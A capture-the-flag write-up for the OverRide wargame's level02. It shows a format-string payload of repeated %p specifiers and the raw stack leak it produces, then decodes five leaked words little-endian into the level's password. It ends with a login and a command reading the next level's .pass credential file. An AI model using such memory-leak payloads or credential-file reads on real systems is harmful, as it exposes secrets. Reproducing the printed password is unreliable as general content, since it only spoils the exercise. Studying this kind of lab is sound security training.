# Level02 Override — Format String Leak Writeup

## Vulnerability Analysis

After checking the code in assembly, we found that `printf` doesn't contain a format string of its own — the username buffer we control gets passed directly as the format-string argument. This is a vulnerability because `printf` will parse whatever we type as format specifiers and pull matching arguments off the stack, letting us leak memory we shouldn't have access to.

## The Exploit Input

Since the username buffer is allocated as **100 bytes**, we fill it with repeated `%p` specifiers to leak as much of the stack as the buffer allows:

```
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
```

(100 bytes / 2 chars per `%p` ≈ 50 `%p` specifiers to fill the buffer — adjust the exact count to match how many fit in 100 bytes alongside any newline/null terminator.)

## Raw Leak Output

```
0x7fffffffe500 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a
0x7fffffffe6f8 0x1f7ff9a08
0x2570257025702570 (x12, repeated)
0x100702570 (nil)
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d
(nil)
0x7025702570257025 (x12, repeated)
0x2900257025 0x602010 (nil)
0x7ffff7a3d7ed (nil)
0x7fffffffe6f8 0x100000000 0x400814 (nil)
0x8e4af204bb436778
```

## Where the Password Starts and Ends

Scanning the tokens, most of them are either:

- Stack/heap addresses (`0x7fffffff...`, `0x7ffff7...`)
- `(nil)` — null pointers
- Repeating `0x2570257025702570` / `0x7025702570257025` blocks — this is just the **echo of our own input format string** landing back on the stack (`%p` = bytes `25 70` = ASCII `%p`, repeated because we passed many `%p`s)

Sandwiched between two of those repeating echo blocks (right after the first block ends, and right before the second one begins) sit **5 tokens that don't fit the address or echo pattern** — these are the password:

```
START →  0x756e505234376848
         0x45414a3561733951
         0x377a7143574e6758
         0x354a35686e475873
END   →  0x48336750664b394d
```

Five 8-byte (64-bit) words = 40 bytes total, which lines up with a 40-character password.

## Converting: Split → Little-Endian → ASCII

Each `0x...` token is one 8-byte stack word. `%p` prints it in big-endian-looking hex notation (most significant byte first), but the CPU actually stores it in memory **little-endian** (least significant byte first). To recover the original byte order the string was written in, we reverse the byte order of each word, then map each byte to its ASCII character.

| Leaked hex word | Bytes (as printed) | Reversed (little-endian) | ASCII |
|---|---|---|---|
| `0x756e505234376848` | `75 6e 50 52 34 37 68 48` | `48 68 37 34 52 50 6e 75` | `Hh74RPnu` |
| `0x45414a3561733951` | `45 41 4a 35 61 73 39 51` | `51 39 73 61 35 4a 41 45` | `Q9sa5JAE` |
| `0x377a7143574e6758` | `37 7a 71 43 57 4e 67 58` | `58 67 4e 57 43 71 7a 37` | `XgNWCqz7` |
| `0x354a35686e475873` | `35 4a 35 68 6e 47 58 73` | `73 58 47 6e 68 35 4a 35` | `sXGnh5J5` |
| `0x48336750664b394d` | `48 33 67 50 66 4b 39 4d` | `4d 39 4b 66 50 67 33 48` | `M9KfPg3H` |

Concatenating each ASCII chunk **in order** gives the full password:

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

## Why `%p` Worked Better Than `%x` Here

- `%x` on a 32-bit read can silently drop leading zero nibbles, which shifts the byte alignment of everything that follows it once you concatenate outputs together — that's what caused garbled results in an earlier attempt with this challenge.
- `%p` on a 64-bit target prints the full pointer-width value (`0x` + up to 16 hex digits) consistently, so each token maps cleanly to one full 8-byte stack word with no ambiguity about where one value ends and the next begins.

## Result — Logging In With the Recovered Password

Using `admin` as the username and the recovered string as the password successfully authenticates:

```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: admin]
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H]
*****************************************
Greetings, admin!
```

From there, reading the next level's password file confirms access was granted:

```
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

This confirms the leaked password reconstructed via the `%p` → little-endian → ASCII method was correct, and completes level02.